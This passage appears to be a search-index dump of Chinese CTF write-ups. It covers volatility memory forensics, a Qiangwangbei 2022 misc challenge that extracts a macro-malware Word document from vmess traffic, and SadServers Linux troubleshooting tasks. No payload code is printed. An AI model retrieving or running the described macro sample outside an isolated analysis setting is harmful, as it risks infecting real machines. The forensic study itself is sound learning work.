SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 192.168.17.129 - - [05/Nov/2022 03:08:43] \"GET /mem.zip HTTP/1.1\" 200 - \u6709\u4e00\u53e5 \"Stucked? You can ask WallPaper god for help.\"\u3002\u6240\u4ee5\u5728 strings \u91cc\u9762\u518d\u641c Wallpaper\uff0c\u53d1\u73b0\u6709\u76f8\u5173\u6587\u4ef6\uff0c\u7ee7\u7eed volatility \u68ad\uff1a volatility -f mem.raw --profile = Win7SP1x64 filescan > files.txt \u6709\u5f88\u591a\u5f88\u591a\u6587\u4ef6\uff0c\u5728\u91cc\u9762\u641c\u4e00\u4e0b\u53d1\u73b0\u4e86\u4e24\u4e2a Wallpaper \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff1a Offset(P) #Ptr #Hnd Access Name ------------------ ------ ------ ------ ---- ... 0x000000007eee11c0 10 0 R--r-- \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg ... 0x000000007fc48f20 16 0 R--r-d \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpeg ... \u7136\u540e\u5206\u522b\u7528 volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q <Offset> --dump-dir=./ \u63d0\u53d6\uff0c\u53d1\u73b0\u4e0a\u9762\u4e00\u5f20\u662f Win7 \u7ecf\u5178\u58c1\u7eb8\uff0c\u4e0b\u9762\u4e00\u5f20\u662f\uff1a \u7136\u540e\u8fd9\u91cc\u5361\u4f4f\u4e86\uff0c\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u4e5f\u627e\u4e0d\u51fa\u4ed6\u8bf4\u7684\u6ca1\u6709 Desktop \u7684 full path \u662f\u4ec0\u4e48\u3002 \u8d5b\u540e\u542c\u8bf4\u662f\u8981\u7528 volatility \u7684 mtfparser \u6307\u4ee4\uff0c\u8bd5\u4e86\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u6709\u7684\uff1a volatility -f mem.raw --profile = Win7SP1x64 mftparser > mftparser.txt \u6709\u4e2a\u8def\u5f84 PROGRA~2\\WINDOW~2\\ACCESS~1\\flag.zip \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8fd9\u4e2a\u7f29\u5199\u5b9e\u9645\u4e0a\u662f C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip \u3002\u6240\u4ee5\u538b\u7f29\u5305\u7684\u5bc6\u7801\u5c31\u662f\uff08 \\f \u5c31\u662f\u8981\u8fd9\u6837\u653e\u7740\u4e0d\u7ba1\uff0c\u9898\u76ee\u7ed9\u4e86 note \u4e86\uff09\uff1a hashlib . md5 ( b \"C:\\Program Files (x86)\\Windows NT\\Accessories \\f lag.zip\" ) . hexdigest () # 0d3ba7db468bdbd4f93a88c97ba7bef1 \u89e3\u538b\u51fa\u6765\u5c31\u662f flag \u4e86\u3002 \u53cd\u6b63\u8fd8\u662f volatility \u4e0d\u719f\u7ec3\uff0c\u8bb0\u4e0b\u4e86\u3002Windows \u4e0b\u4e00\u4e9b\u5220\u6389\u4e86\u7684\u6587\u4ef6\u53ef\u4ee5\u5c1d\u8bd5\u7528 mtfparser \u6765\u641c\u4e00\u4e0b\u3002","title":"just find flag"},{"location":"writeups/qwb2022/","text":"\u5f3a\u7f51\u676f 2022 Quals Writeup \u00b6 Abstract misc \u5f88\u5c11\uff0c\u53ea\u505a\u4e86\u789f\u5f71\u91cd\u91cd\u4e00\u9053\u9898\uff0c\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\u3002\u4e00\u5c42\u4e00\u5c42\u6beb\u65e0\u610f\u4e49\u5730\u786c\u5957\u5a03\uff0c\u505a\u4e86\u597d\u957f\u597d\u957f\u65f6\u95f4\uff0c\u6700\u540e\u5dee\u51e0\u5206\u949f\u6ca1\u505a\u51fa\u6765\uff0c\u771f\u7684\u7834\u9632 (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b \u789f\u5f71\u91cd\u91cd \u00b6 \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305\u548c\u4e00\u4e2a\u6d41\u91cf\u5305 \u538b\u7f29\u5305\u7ed3\u5c3e\u9644\u52a0\u4fe1\u606f Password is md5(api address) \u6d41\u91cf\u5305\u770b\u4e0d\u51fa\u4ec0\u4e48\u540d\u5802\uff0c\u76f4\u5230\u7ed9\u4e86\u7b2c\u4e00\u4e2a hint\uff1avmess \u6d41\u91cf\u3002\u4e8e\u662f\u5c31\u53bb\u7ffb\u770b vmess \u7684\u6587\u6863\uff0c\u7ed3\u679c\u6587\u6863\u5199\u7684\u4e0d\u4ec5\ud83d\udca9\u4e00\u6837\u8fd8\u5168**\u662f\u9519\u7684\u3002\u88ab\u8feb\u770b v2ray \u7684\u6e90\u7801\uff0c\u4f46 v2ray \u7684\u6e90\u7801\u8fd8\u662f go \u5199\u7684\uff0c\u8fd9\u96be\u770b\u7684\u8bed\u8a00\u771f\u7684\u8981\u7ed9\u6211\u770b\u5410\u4e86\u3002\u7ffb\u627e\u5230\u4e86 rust \u5199\u7684 leaf \u9879\u76ee\uff0c\u91cc\u9762\u6709 vmess \u76f8\u5173\u7684\u4e1c\u897f\uff0c\u770b\u7684\u5f88\u8212\u9002\u3002\u6700\u540e\u770b\u6e90\u7801\u770b\u51fa\u6765\u7684 vmess \u534f\u8bae\u5185\u5bb9\u5728 vmess \u534f\u8bae \u9875\u9762 \u6839\u636e\u534f\u8bae\u8be6\u7ec6\u4fe1\u606f\u89e3\u7801\u8bf7\u6c42\u6d41\u91cf\uff0c\u5f97\u5230\uff1a GET /out HTTP / 1.1 Host : 127.0.0.1:5000 User-Agent : curl/7.75.0 Accept : */* Connection : close \u89e3\u7801\u54cd\u5e94\u6d41\u91cf\u5f97\u5230\u4e00\u4e2a\u5f88\u957f\u7684 html\uff0c\u91cc\u9762\u5b9e\u9645\u4f5c\u7528\u662f\u7528 base64 \u89e3\u7801\u5f97\u5230\u4e00\u4e2a doc \u6587\u6863\u5e76\u4e0b\u8f7d\u3002\u901a\u8fc7\u89e3\u7801\u6216\u8005\u6253\u5f00 html \u90fd\u53ef\u4ee5\u5f97\u5230\u8fd9\u4e2a doc \u6587\u6863\u3002\u4e0d\u8fc7\u5176\u4e2d\u5305\u542b\u4e86\u75c5\u6bd2\u5b8f\uff0c\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u6e05\u7406\uff08mac \u4e0d\u4f1a\uff09 \u5c06\u6269\u5c55\u540d\u6539\u4e3a .zip \u5e76\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u5b8f\uff08\u6216\u8005\u8fdb\u5165 Word \u6253\u5f00\u5b8f\u7f16\u8f91\u5668\uff09\u5206\u6790\u4e86\u597d\u4e45\u90a3\u4e00\u5806\u6df7\u6dc6\u7684\u5b8f\uff0c\u6ca1\u4ec0\u4e48\u8fdb\u5c55\uff0c\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u4e00\u4e2a dll\uff0c\u627e\u5230\u540e\u9006\u4e5f\u6ca1\u9006\u5230\u4ec0\u4e48 \u8003\u8651\u5230\u9632\u706b\u5899\u4f1a\u81ea\u52a8\u6e05\u7406\uff0c\u4ee5\u53ca\u5b8f\u7684\u5199\u6cd5\u548c doc\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u8001\u75c5\u6bd2\uff0c\u4e8e\u662f\u7ed3\u5408 dll \u7684 sha256 \u503c\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u679c\u7136\u5f97\u5230\u4e86\u5206\u6790\uff1a https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919 \u91cc\u9762\u5c31\u6709\u8fd9\u4e2a api address\uff1aapi.ipify.org\uff0cmd5 \u540e\u5f97\u5230\u5bc6\u7801 08229f4052dde89671134f1784bed2d6 \u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u91cc\u9762\u53ef\u4ee5\u770b\u5230 \"GobThis is a Gob File!Time2022-07-19 14:49:56PNG File\"\uff0c\u662f go \u7684\u5e8f\u5217\u5316\u6587\u4ef6\uff0c\u4f7f\u7528 drosseau/degob \u53cd\u5e8f\u5217\u5316\uff0c\u5f97\u5230 png \u7684\u9010\u5b57\u8282\u503c \u4e0d\u8fc7\u8fd9\u4e9b\u503c\u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540e\u5e76\u4e0d\u80fd\u6253\u5f00\u56fe\u7247\uff0c\u53c8\u5361\u4f4f\u4e86\uff0c\u6709\u4e86\u7b2c\u4e09\u4e2a hint\uff1a\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u4ed6\u628a\u6570\u636e\u968f\u673a\u6253\u4e71\u4e86\u3002\u5f88\u65e0\u8bed\uff0c\u5c31\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\uff0c\u867d\u7136\u8bf4\u6709\u65f6\u95f4\u79cd\u5b50\u7684\u6697\u793a\uff0c\u4f46\u5e76\u4e0d\u5f3a\u70c8\uff0c\u7eaf\u7eaf\u50bb\u903c \u7528 go \u5199\u4e00\u4e2a\u968f\u673a\u6253\u4e71\u7684\u7a0b\u5e8f\uff0c\u6309\u7167\u6253\u4e71\u7684\u903b\u8f91\u53cd\u8fc7\u6765\uff0c\u5c31\u53ef\u4ee5\u6062\u590d png \u56fe\u7247\u3002\u4e0d\u8fc7\u5199\u4ee4\u6211\u53cd\u611f\u7684 go \u4ee3\u7801\u6709\u591f\u70e6\u7684 \u56fe\u7247\u6253\u5f00\u4e4b\u540e\u662f flag not here \u6587\u5b57\u3002\u53c8\u662f\u5f88\u65e0\u8bed\uff0c\u5230\u8fd9\u4e86\u8fd8**\u5957\u5a03 \u4e22\u5230 stegsolve \u91cc\uff0c\u770b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff0cred green plane \u6709\u5947\u602a\u7684\u952f\u9f7f\u72b6\u3002\u540e\u6765\u53d1\u73b0 alpha \u901a\u9053\u90fd\u662f\u6709\u503c\u7684\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7 alpha \u901a\u9053\u4f20\u4fe1\u606f\uff08\u4e0d\u8fc7\u8fd9\u65f6\u6bd4\u8d5b\u5df2\u7ecf\u5feb\u7ed3\u675f\u4e86\uff09 \u7528 PIL \u63d0\u53d6 alpha \u901a\u9053\u7684\u503c\uff0c\u679c\u7136\u6709\u5f88\u591a\u4e0d\u540c\u503c\uff0c\u4e0d\u8fc7\u5927\u90e8\u5206\u8fd8\u662f 0xff \u548c 0x00\uff0c\u6240\u4ee5\u8003\u8651\u53bb\u6389 0xff \u548c 0x00 \u770b\u4e00\u770b\uff0c\u5c06\u56fe\u7247\u5c55\u5f00\u6210\u4e00\u7ef4\uff0c\u7136\u540e\u5254\u9664 ff \u548c 00 \u5f97\u5230\u5b57\u8282\u5f62\u5f0f\u7684\u4e00\u5806 flag\uff1a img = Image . open ( \"flag.png\" ) arr = np . array ( img ) width , height = img . size bytes ( arr [:,:, 3 ] . reshape ( width * height )) . replace ( b \" \\xff \" , b \"\" ) . replace ( b \" \\x00 \" , b \"\" ) # b'flag{898161df-fabf-4757-82b6-ffe407c69475}flag{898161df-f... \u6700\u7ec8 flag: flag{898161df-fabf-4757-82b6-ffe407c69475} \u7ec6\u6570\u4e00\u4e0b\u8fd9\u9898\u6709\u51e0\u5c42\uff1a \u89e3\u7801 vmess \u6d41\u91cf \u627e\u5230 doc \u4e2d\u7684\u5b8f \u901a\u8fc7\u5206\u6790\u5b8f\u627e\u5230\u75c5\u6bd2\u8c03\u7528\u7684 api \u5730\u5740 \u89e3\u7801 gob \u6587\u4ef6 \u901a\u8fc7\u65f6\u95f4\u968f\u673a\u79cd\u5b50\u6062\u590d\u4e71\u5e8f\u7684 png \u6587\u4ef6 png alpha \u901a\u9053\u9690\u5199 \u5f88\u591a\u6b65\u9aa4\u6ca1\u6709\u5145\u8db3\u7684\u63d0\u793a\uff0c\u800c\u4e14\u5f88\u591a\u662f\u7eaf\u7eaf\u6ca1\u5fc5\u8981\u7684\u786c\u5957\u3002\u6ca1\u6709\u96be\u9898\u53ef\u4ee5\u4e0d\u51fa\uff0c\u4e0d\u8981\u7528\u8fd9\u79cd\u9898\u6076\u5fc3\u9009\u624b\u2026\u2026","title":"\u5f3a\u7f51\u676f 2022 Quals"},{"location":"writeups/qwb2022/#2022-quals-writeup","text":"Abstract misc \u5f88\u5c11\uff0c\u53ea\u505a\u4e86\u789f\u5f71\u91cd\u91cd\u4e00\u9053\u9898\uff0c\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\u3002\u4e00\u5c42\u4e00\u5c42\u6beb\u65e0\u610f\u4e49\u5730\u786c\u5957\u5a03\uff0c\u505a\u4e86\u597d\u957f\u597d\u957f\u65f6\u95f4\uff0c\u6700\u540e\u5dee\u51e0\u5206\u949f\u6ca1\u505a\u51fa\u6765\uff0c\u771f\u7684\u7834\u9632 (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b","title":"\u5f3a\u7f51\u676f 2022 Quals Writeup"},{"location":"writeups/qwb2022/#_1","text":"\u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305\u548c\u4e00\u4e2a\u6d41\u91cf\u5305 \u538b\u7f29\u5305\u7ed3\u5c3e\u9644\u52a0\u4fe1\u606f Password is md5(api address) \u6d41\u91cf\u5305\u770b\u4e0d\u51fa\u4ec0\u4e48\u540d\u5802\uff0c\u76f4\u5230\u7ed9\u4e86\u7b2c\u4e00\u4e2a hint\uff1avmess \u6d41\u91cf\u3002\u4e8e\u662f\u5c31\u53bb\u7ffb\u770b vmess \u7684\u6587\u6863\uff0c\u7ed3\u679c\u6587\u6863\u5199\u7684\u4e0d\u4ec5\ud83d\udca9\u4e00\u6837\u8fd8\u5168**\u662f\u9519\u7684\u3002\u88ab\u8feb\u770b v2ray \u7684\u6e90\u7801\uff0c\u4f46 v2ray \u7684\u6e90\u7801\u8fd8\u662f go \u5199\u7684\uff0c\u8fd9\u96be\u770b\u7684\u8bed\u8a00\u771f\u7684\u8981\u7ed9\u6211\u770b\u5410\u4e86\u3002\u7ffb\u627e\u5230\u4e86 rust \u5199\u7684 leaf \u9879\u76ee\uff0c\u91cc\u9762\u6709 vmess \u76f8\u5173\u7684\u4e1c\u897f\uff0c\u770b\u7684\u5f88\u8212\u9002\u3002\u6700\u540e\u770b\u6e90\u7801\u770b\u51fa\u6765\u7684 vmess \u534f\u8bae\u5185\u5bb9\u5728 vmess \u534f\u8bae \u9875\u9762 \u6839\u636e\u534f\u8bae\u8be6\u7ec6\u4fe1\u606f\u89e3\u7801\u8bf7\u6c42\u6d41\u91cf\uff0c\u5f97\u5230\uff1a GET /out HTTP / 1.1 Host : 127.0.0.1:5000 User-Agent : curl/7.75.0 Accept : */* Connection : close \u89e3\u7801\u54cd\u5e94\u6d41\u91cf\u5f97\u5230\u4e00\u4e2a\u5f88\u957f\u7684 html\uff0c\u91cc\u9762\u5b9e\u9645\u4f5c\u7528\u662f\u7528 base64 \u89e3\u7801\u5f97\u5230\u4e00\u4e2a doc \u6587\u6863\u5e76\u4e0b\u8f7d\u3002\u901a\u8fc7\u89e3\u7801\u6216\u8005\u6253\u5f00 html \u90fd\u53ef\u4ee5\u5f97\u5230\u8fd9\u4e2a doc \u6587\u6863\u3002\u4e0d\u8fc7\u5176\u4e2d\u5305\u542b\u4e86\u75c5\u6bd2\u5b8f\uff0c\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u6e05\u7406\uff08mac \u4e0d\u4f1a\uff09 \u5c06\u6269\u5c55\u540d\u6539\u4e3a .zip \u5e76\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u5b8f\uff08\u6216\u8005\u8fdb\u5165 Word \u6253\u5f00\u5b8f\u7f16\u8f91\u5668\uff09\u5206\u6790\u4e86\u597d\u4e45\u90a3\u4e00\u5806\u6df7\u6dc6\u7684\u5b8f\uff0c\u6ca1\u4ec0\u4e48\u8fdb\u5c55\uff0c\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u4e00\u4e2a dll\uff0c\u627e\u5230\u540e\u9006\u4e5f\u6ca1\u9006\u5230\u4ec0\u4e48 \u8003\u8651\u5230\u9632\u706b\u5899\u4f1a\u81ea\u52a8\u6e05\u7406\uff0c\u4ee5\u53ca\u5b8f\u7684\u5199\u6cd5\u548c doc\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u8001\u75c5\u6bd2\uff0c\u4e8e\u662f\u7ed3\u5408 dll \u7684 sha256 \u503c\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u679c\u7136\u5f97\u5230\u4e86\u5206\u6790\uff1a https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919 \u91cc\u9762\u5c31\u6709\u8fd9\u4e2a api address\uff1aapi.ipify.org\uff0cmd5 \u540e\u5f97\u5230\u5bc6\u7801 08229f4052dde89671134f1784bed2d6 \u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u91cc\u9762\u53ef\u4ee5\u770b\u5230 \"GobThis is a Gob File!Time2022-07-19 14:49:56PNG File\"\uff0c\u662f go \u7684\u5e8f\u5217\u5316\u6587\u4ef6\uff0c\u4f7f\u7528 drosseau/degob \u53cd\u5e8f\u5217\u5316\uff0c\u5f97\u5230 png \u7684\u9010\u5b57\u8282\u503c \u4e0d\u8fc7\u8fd9\u4e9b\u503c\u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540e\u5e76\u4e0d\u80fd\u6253\u5f00\u56fe\u7247\uff0c\u53c8\u5361\u4f4f\u4e86\uff0c\u6709\u4e86\u7b2c\u4e09\u4e2a hint\uff1a\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u4ed6\u628a\u6570\u636e\u968f\u673a\u6253\u4e71\u4e86\u3002\u5f88\u65e0\u8bed\uff0c\u5c31\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\uff0c\u867d\u7136\u8bf4\u6709\u65f6\u95f4\u79cd\u5b50\u7684\u6697\u793a\uff0c\u4f46\u5e76\u4e0d\u5f3a\u70c8\uff0c\u7eaf\u7eaf\u50bb\u903c \u7528 go \u5199\u4e00\u4e2a\u968f\u673a\u6253\u4e71\u7684\u7a0b\u5e8f\uff0c\u6309\u7167\u6253\u4e71\u7684\u903b\u8f91\u53cd\u8fc7\u6765\uff0c\u5c31\u53ef\u4ee5\u6062\u590d png \u56fe\u7247\u3002\u4e0d\u8fc7\u5199\u4ee4\u6211\u53cd\u611f\u7684 go \u4ee3\u7801\u6709\u591f\u70e6\u7684 \u56fe\u7247\u6253\u5f00\u4e4b\u540e\u662f flag not here \u6587\u5b57\u3002\u53c8\u662f\u5f88\u65e0\u8bed\uff0c\u5230\u8fd9\u4e86\u8fd8**\u5957\u5a03 \u4e22\u5230 stegsolve \u91cc\uff0c\u770b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff0cred green plane \u6709\u5947\u602a\u7684\u952f\u9f7f\u72b6\u3002\u540e\u6765\u53d1\u73b0 alpha \u901a\u9053\u90fd\u662f\u6709\u503c\u7684\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7 alpha \u901a\u9053\u4f20\u4fe1\u606f\uff08\u4e0d\u8fc7\u8fd9\u65f6\u6bd4\u8d5b\u5df2\u7ecf\u5feb\u7ed3\u675f\u4e86\uff09 \u7528 PIL \u63d0\u53d6 alpha \u901a\u9053\u7684\u503c\uff0c\u679c\u7136\u6709\u5f88\u591a\u4e0d\u540c\u503c\uff0c\u4e0d\u8fc7\u5927\u90e8\u5206\u8fd8\u662f 0xff \u548c 0x00\uff0c\u6240\u4ee5\u8003\u8651\u53bb\u6389 0xff \u548c 0x00 \u770b\u4e00\u770b\uff0c\u5c06\u56fe\u7247\u5c55\u5f00\u6210\u4e00\u7ef4\uff0c\u7136\u540e\u5254\u9664 ff \u548c 00 \u5f97\u5230\u5b57\u8282\u5f62\u5f0f\u7684\u4e00\u5806 flag\uff1a img = Image . open ( \"flag.png\" ) arr = np . array ( img ) width , height = img . size bytes ( arr [:,:, 3 ] . reshape ( width * height )) . replace ( b \" \\xff \" , b \"\" ) . replace ( b \" \\x00 \" , b \"\" ) # b'flag{898161df-fabf-4757-82b6-ffe407c69475}flag{898161df-f... \u6700\u7ec8 flag: flag{898161df-fabf-4757-82b6-ffe407c69475} \u7ec6\u6570\u4e00\u4e0b\u8fd9\u9898\u6709\u51e0\u5c42\uff1a \u89e3\u7801 vmess \u6d41\u91cf \u627e\u5230 doc \u4e2d\u7684\u5b8f \u901a\u8fc7\u5206\u6790\u5b8f\u627e\u5230\u75c5\u6bd2\u8c03\u7528\u7684 api \u5730\u5740 \u89e3\u7801 gob \u6587\u4ef6 \u901a\u8fc7\u65f6\u95f4\u968f\u673a\u79cd\u5b50\u6062\u590d\u4e71\u5e8f\u7684 png \u6587\u4ef6 png alpha \u901a\u9053\u9690\u5199 \u5f88\u591a\u6b65\u9aa4\u6ca1\u6709\u5145\u8db3\u7684\u63d0\u793a\uff0c\u800c\u4e14\u5f88\u591a\u662f\u7eaf\u7eaf\u6ca1\u5fc5\u8981\u7684\u786c\u5957\u3002\u6ca1\u6709\u96be\u9898\u53ef\u4ee5\u4e0d\u51fa\uff0c\u4e0d\u8981\u7528\u8fd9\u79cd\u9898\u6076\u5fc3\u9009\u624b\u2026\u2026","title":"\u789f\u5f71\u91cd\u91cd"},{"location":"writeups/sadservers/","text":"SadServers Writeup \u00b6 Abstract \u6c34 tg \u53d1\u73b0\u7684\uff0c\u633a\u597d\u73a9\u7684\uff0c\u5c31\u505a\u4e00\u505a\uff0c\u5b66\u5230\u5f88\u591a\uff0c\u5c31\u5199\u4e00\u5199\u3002 \u5e73\u53f0\u5730\u5740\u5728 https://sadservers.com/ \u3002\u5927\u6982\u7c7b\u4f3c\u8fd0\u7ef4\uff1f\u53cd\u6b63\u5927\u6982\u5c31\u662f\u4fee\u590d\u4e00\u4e9b Linux \u670d\u52a1\u5668\u51fa\u73b0\u7684\u95ee\u9898\u3002 \u4e0d\u7b97 CTF\uff0c\u4e0d\u77e5\u9053\u548b\u5206\u7c7b\uff0c\u5c31\u6254\u8fd9\u91cc\u5427 \u770b\u8d77\u6765\u9898\u76ee\u4e0d\u591a\uff0c\u636e\u8bf4\u662f \"new challenges weekly\"\uff0c\u51fa\u7684\u8bdd\u6216\u8bb8\u53ef\u4ee5\u968f\u65f6\u66f4\u65b0\uff1f\uff08\u5495\u5495\u5495 \"Saint John\" \u00b6 Scenario: \"Saint John\": what is writing to this log file? Level: Easy Description: A developer created a testing program that is continuously writing to a log file /var/log/bad.log and filling up disk. You can check for example with tail -f /var/log/bad.log . This program is no longer needed. Find it and terminate it. OS: Ubuntu 22.04 LTS \u53ef\u4ee5 tail -f /var/log/bad.log \u770b\u4e00\u773c\u786e\u5b9e\u5728\u4e00\u76f4\u586b\u4e1c\u897f\u3002\u7136\u540e\u5f53\u7136\u662f\u5148\u67e5\u4e00\u4e0b\u540e\u53f0\u8fdb\u7a0b ps -aux\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u6761\u5f88\u53ef\u7591\uff1a USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... ubuntu 610 0.0 1.7 17672 8212 ? S 07:57 0:00 /usr/bin/python3 /home/ubuntu/badlog.py ... \u53ef\u4ee5 cat \u770b\u4e00\u4e0b badlog.py: #! /usr/bin/python3 # test python writing to a file import random import time from datetime import datetime f = open ( '/var/log/bad.log' , 'a' ) while True : r = random . randrange ( 2147483647 ) f . write ( str ( datetime . now ()) + ' token: ' + str ( r ) + ' \\n ' ) f . flush () time . sleep ( 1 ) \u786e\u5b9e\u662f\u5728\u6bcf\u4e00\u79d2\u5199\u4e00\u884c\u3002\u6240\u4ee5\u76f4\u63a5 kill -9 610 \u5f3a\u5236\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\u5c31\u597d\u4e86\u3002 \u9898\u76ee\u7684\u672c\u610f\u5927\u6982\u662f\u7528 lsof \u6765\u67e5\u770b\u4f7f\u7528\u67d0\u4e00\u6587\u4ef6\u7684\u8fdb\u7a0b\uff1a ubuntu@ip-172-31-32-108:/$ lsof /var/log/bad.log COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME badlog.py 610 ubuntu 3w REG 259,1 31275 67701 /var/log/bad.log \u7136\u540e\u540c\u6837\u662f\u5f3a\u6740\u3002 \"Saskatoon\" \u00b6 Scenario: \"Saskatoon\": counting IPs. Level: Easy Description: There's a web server access log file at /home/admin/access.log. The file consists of one line per HTTP request, with the requester's IP address at the beginning of each line. Find what's the IP address that has the most requests in this file (there's no tie; the IP is unique). Write the solution into a file /home/admin/highestip.txt. For example, if your solution is \"1.2.3.4\", you can do echo \"1.2.3.4\" > /home/admin/highestip.txt OS: Debian 11 \u6240\u6709\u9700\u8981\u7684\u4e1c\u897f\u90fd\u5728 access.log \u91cc\u9762\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a python \u811a\u672c\u8bfb\u53d6\u3001\u7edf\u8ba1\u3001\u6392\u5e8f\u3001\u8f93\u51fa\u5c31\u597d\u4e86\uff1a with open ( \"/home/admin/access.log\" , \"r\" ) as f : contents = f . readlines () ips = [ line . split ( \" \" )[ 0 ] for line in contents ] cnt = list ( set ([( ips . count ( ip ), ip ) for ip in ips ])) print ( sorted ( cnt )[ - 1 ]) # (482, '66.249.73.135') \u6240\u4ee5\u8bf7\u6c42\u6700\u591a\u7684 ip \u5c31\u662f 66.249.73.135\u3002 \u5f53\u7136\u9898\u76ee\u7684\u610f\u601d\u662f\u901a\u8fc7 shell \u547d\u4ee4\u76f4\u63a5\u6765\u505a\u3002\u53ef\u4ee5 cat \u7136\u540e cut \u6765\u53d6\u51fa ip\uff0c\u7136\u540e sort | uniq -c \u6765\u7edf\u8ba1\u6b21\u6570\uff08\u8981\u5148 sort\uff0cuniq \u53ea\u4f1a\u7edf\u8ba1\u76f8\u90bb\u7684\u91cd\u590d\u884c\uff09\uff0c\u4e4b\u540e\u5728 sort \u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u884c\u5c31\u662f\u8981\u7684\u4e86\uff1a $ cat /home/admin/access.log | cut -d ' ' -f 1 | sort | uniq -c | sort | tail -n 1 482 66.249.73.135 \u7528 awk \u6765\u5904\u7406\u4e5f\u5f88\u65b9\u4fbf\uff0c\u76f4\u63a5\u4e00\u884c\u89e3\u51b3\uff1a $ awk '{print $1}' /home/admin/access.log | sort | uniq -c | sort | tail -n 1 | awk '{print $2}' > /home/admin/highestip.txt \"Tokyo\" \u00b6 Scenario: \"Tokyo\": can't serve web file Level: Medium Description: There's a web server serving a file /var/www/html/index.html with content \"hello sadserver\" but when we try to check it locally with an HTTP client like curl 127.0.0.1:80, nothing is returned. This scenario is not about the particular web server configuration and you only need to have general knowledge about how web servers work. OS: Ubuntu 22.04 LTS ps -aux \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a web server \u670d\u52a1\u662f\u7531 apache2 \u63d0\u4f9b\u7684\uff1a USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... www-data 774 0.0 0.9 1211728 4304 ? Sl 08:27 0:00 /usr/sbin/apache2 -k start www-data 775 0.0 0.9 1211728 4304 ? Sl 08:27 0:00 /usr/sbin/apache2 -k start ... \u53bb /etc/apache2 \u901b\u4e86\u4e00\u5708\uff0c\u786e\u5b9e\u6ca1\u4ec0\u4e48\u95ee\u9898\u3002 curl -v 127.0.0.1:80 \uff0c\u53d1\u73b0\u6839\u672c\u5c31\u8fde\u4e0d\u4e0a\u3002\u53ef\u80fd\u662f\u9632\u706b\u5899\u7684\u95ee\u9898\uff0c\u770b\u4e00\u4e0b iptables\uff1a # iptables -L -n Chain INPUT (policy ACCEPT) target prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination \u53d1\u73b0 INPUT \u94fe\u628a\u6240\u6709 tcp \u5305\u90fd DROP \u4e86\u3002\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u60c5\u51b5\u89c4\u5219\uff1a # iptables -F \u7136\u540e\u518d curl \u53d1\u73b0\u8fd4\u56de 403 Forbidden\u3002\u68c0\u67e5\u4e00\u4e0b /var/www/html/index.html \u7684\u6743\u9650\uff1a # ls -l /var/www/html/index.html -rw------- 1 root root 16 Aug 1 00:40 /var/www/html/index.html \u6240\u4ee5\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u6743\u9650\uff0c\u8ba9\u6240\u6709\u4eba\u53ef\u8bfb\uff1a # chmod +r /var/www/html/index.html \u7136\u540e\u518d curl \u5c31\u53ef\u4ee5\u4e86\u3002 \"Manhattan\" \u00b6 Scenario: \"Manhattan\": can't write data into database. Level: Medium Description: Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help). Helpful Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file 